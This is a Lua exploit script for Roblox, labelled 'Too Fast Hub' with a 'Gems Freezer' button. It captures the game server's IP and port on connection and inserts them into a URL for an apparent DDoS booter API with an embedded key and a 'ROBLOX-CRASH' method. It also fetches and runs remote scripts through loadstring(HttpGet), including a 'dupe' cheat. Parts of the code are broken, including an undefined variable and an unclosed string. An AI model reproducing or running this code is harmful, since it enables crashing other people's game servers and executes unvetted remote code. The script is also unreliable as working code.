game:GetService("NetworkClient").ConnectionAccepted:connect(function(peer)
    print("Server IP and port is " .. peer)
    local ipAndPort = peer
    local separator = "|"
    local parts = {}
    for part in ipAndPort:gmatch("[^" .. separator .. "]+") do
        table.insert(parts, part)
    end
    local ip = parts[1]
    local port = parts[2]
    print("IP address: " .. ip)
    print("Port number: " .. port)
    getgenv().peers = peer
    local url = "https://snoopy.sh/apistart.php?key=BnFuYZJkXQ49&target=[ip]&port=[port]&time=[time]&method=ROBLOX-CRASH"
    url = url:gsub("%[ip%]", ip)
    url = url:gsub("%[port%]", port)
    url = url:gsub("%[time%]", time)
end)

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Too Fast Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "ZNX"})

local Tab = Window:MakeTab({
    Name = "Gems Freezer",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = Tab:AddSection({
    Name = "Gems Freezer"
})


Tab:AddButton({
    Name = "Click Me To Start Freeze Gems",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialTooFastHub/Dupe_Script2/main/script.lua))()
    end    
})

OrionLib:Init()
